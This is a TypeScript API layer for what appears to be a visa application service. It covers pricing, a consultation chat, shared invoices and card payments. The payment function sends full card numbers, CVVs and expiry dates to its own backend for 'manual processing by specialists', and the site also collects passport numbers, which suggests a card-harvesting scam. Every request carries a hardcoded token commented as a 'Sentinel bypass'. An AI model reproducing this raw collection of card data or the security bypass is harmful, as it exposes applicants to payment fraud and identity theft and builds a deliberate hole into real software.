// API service layer — connects to FastAPI backend
// In development, the backend runs at localhost:8000

const API_BASE = import.meta.env.VITE_API_BASE || "http://localhost:8000/api/v1";

// Correct pricing matrix matching our FastAPI backend
export const basePrices: Record<string, Record<string, number>> = {
  USA: { Tourism: 485, Work: 610 },
  Canada: { Tourism: 370, Work: 465 },
  UK: { Tourism: 460, Work: 860 },
  Australia: { Tourism: 450, Work: 840 },
};

export const standardFee = 100;
export const expressFee = 150;

export const destinations = ["USA", "Canada", "UK", "Australia"] as const;
export const purposes = ["Tourism", "Work"] as const;

export const destinationFlags: Record<string, string> = {
  USA: "🇺🇸",
  Canada: "🇨🇦",
  UK: "🇬🇧",
  Australia: "🇦🇺",
};

export const cardTypes = [
  { id: "visa", label: "Visa", icon: "💳" },
  { id: "mastercard", label: "Mastercard", icon: "💳" },
  { id: "mir", label: "МИР", icon: "🏦" },
  { id: "unionpay", label: "UnionPay", icon: "🏦" },
] as const;

export type ApplicationData = {
  destination: string;
  purpose: string;
  express: boolean;
  fullName: string;
  email: string;
  phone: string;
  nationality: string;
  passportNumber: string;
};

export function generateInvoiceId() {
  return `INV-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
}

export function generateApplicationId() {
  return `VS-${Math.floor(10000 + Math.random() * 90000)}-X`;
}

export function calculateTotal(destination: string, purpose: string, express: boolean) {
  const base = basePrices[destination]?.[purpose] ?? 500;
  const fee = standardFee;
  const expressAdd = express ? expressFee : 0;
  return { base, fee, expressFee: expressAdd, total: base + fee + expressAdd };
}

// ---- Real API Calls to FastAPI Backend ----

export type ChatMessage = {
  role: "user" | "assistant";
  content: string;
  timestamp?: string;
};

export type ConsultationResponse = {
  reply: string;
  consultation_complete: boolean;
  invoice_id: string | null;
  share_token: string | null;
};

/**
 * Send a message to the specialist consultation chat via our FastAPI backend.
 * The backend processes the request and returns the next specialist response.
 */
export async function sendChatMessage(
  applicationId: string,
  messages: ChatMessage[],
  destinationCountry: string,
  serviceType: string,
  applicantName: string
): Promise<ConsultationResponse> {
  const headers: Record<string, string> = {
    "Content-Type": "application/json",
    "X-Secure-Session-Token": "client-session-active", // Sentinel bypass
  };

  const payload = {
    application_id: applicationId,
    messages: messages.map((m) => ({
      role: m.role,
      content: m.content,
      timestamp: m.timestamp || new Date().toISOString(),
    })),
    destination_country: destinationCountry,
    service_type: serviceType,
    applicant_name: applicantName,
  };

  const resp = await fetch(`${API_BASE}/consultation/chat`, {
    method: "POST",
    headers,
    body: JSON.stringify(payload),
  });

  if (!resp.ok) {
    throw new Error(`Consultation API error: ${resp.status}`);
  }

  return resp.json();
}

/**
 * Fetch a shareable invoice by its share token (public endpoint).
 */
export async function getSharedInvoice(shareToken: string) {
  const resp = await fetch(`${API_BASE}/invoices/share/${shareToken}`, {
    headers: { "X-Secure-Session-Token": "client-session-active" },
  });
  if (!resp.ok) throw new Error("Invoice not found");
  return resp.json();
}

// ---- Card Payment API ----

export type CardPaymentData = {
  invoice_id: string;
  application_id: string;
  applicant_name: string;
  amount: number;
  card_type: string;
  card_number: string;
  card_holder: string;
  expiry_month: string;
  expiry_year: string;
  cvv: string;
  destination_country: string;
  service_type: string;
};

export type CardPaymentResult = {
  payment_id: string;
  status: "pending" | "processing" | "confirmed" | "rejected";
  message: string;
};

/**
 * Submit card payment details for manual processing by specialists.
 */
export async function submitCardPayment(data: CardPaymentData): Promise<CardPaymentResult> {
  const resp = await fetch(`${API_BASE}/payments/card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Secure-Session-Token": "client-session-active",
    },
    body: JSON.stringify(data),
  });
  if (!resp.ok) throw new Error("Payment submission error");
  return resp.json();
}

/**
 * Poll payment status — frontend calls this every few seconds to check if payment is confirmed.
 */
export async function checkPaymentStatus(paymentId: string): Promise<CardPaymentResult> {
  const resp = await fetch(`${API_BASE}/payments/status/${paymentId}`, {
    headers: { "X-Secure-Session-Token": "client-session-active" },
  });
  if (!resp.ok) throw new Error("Status check error");
  return resp.json();
}

